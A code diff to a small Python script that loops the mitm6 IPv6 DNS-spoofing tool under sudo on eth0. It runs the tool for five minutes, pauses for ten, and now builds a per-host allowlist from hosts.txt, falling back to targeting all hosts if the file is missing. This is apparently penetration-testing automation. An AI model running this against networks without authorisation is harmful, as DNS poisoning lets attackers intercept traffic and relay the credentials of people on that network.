@@ -1,34 +1,59 @@
 import subprocess
 import time
-import signal
 
-# Define the command and arguments
-command = ['sudo', 'mitm6', '-d', 'domain', '-ignore-nofqdn', '-i', 'eth0']
+# Path to the file that contains the list of hostnames
+hosts_file = 'hosts.txt'
 
-# Define the wait time of 10 minutes in seconds
-wait_time_between_commands = 10 * 60
-wait_time_during_command = 5 * 60
+# Other static options for mitm6
+base_command = [
+    'sudo', 'mitm6',
+    '-d', 'domain',
+    '--ignore-nofqdn',
+    '-i', 'eth0'
+]
+
+# Define the wait times
+wait_time_between_commands = 10 * 60  # 10 minutes
+wait_time_during_command = 5 * 60      # 5 minutes
+
+def build_command():
+    """Build the mitm6 command dynamically by reading the hosts file."""
+    try:
+        with open(hosts_file, 'r') as file:
+            hosts = [line.strip() for line in file if line.strip()]
+    except FileNotFoundError:
+        print(f"Error: Hosts file '{hosts_file}' not found!")
+        return base_command  # Fall back to base command without any allowlist
+
+    # Add --host-allowlist for each host dynamically
+    host_allowlist_args = []
+    for host in hosts:
+        host_allowlist_args.extend(['--host-allowlist', host])
+
+    return base_command + host_allowlist_args
 
 while True:
+    # Build the command dynamically
+    command = build_command()
+    print(f"Starting mitm6 with command: {' '.join(command)}")
+
     # Start the process
-    print("Starting the mitm6 command.")
     process = subprocess.Popen(command)
 
-    # Wait for 5 minutes while the command is running
+    # Wait while the command is running
     time.sleep(wait_time_during_command)
 
     # Terminate the process
     print("Stopping the mitm6 process.")
     process.terminate()
-    
-    # Give it a bit of time to terminate gracefully
+
     try:
-        process.wait(timeout=10)  # Wait for 10 seconds for the process to terminate
+        process.wait(timeout=10)  # Wait for 10 seconds to terminate gracefully
     except subprocess.TimeoutExpired:
         print("mitm6 did not terminate gracefully, killing it.")
-        process.kill()  # Forcefully kill the process if it didn't terminate
-        process.wait()  # Now we wait again to make sure it's killed
+        process.kill()
+        process.wait()
 
-    # Wait for 10 minutes before restarting the command
-    print("Waiting for 10 minutes before restarting the command.")
+    # Wait before restarting
+    print("Waiting 10 minutes before restarting mitm6.")
     time.sleep(wait_time_between_commands)
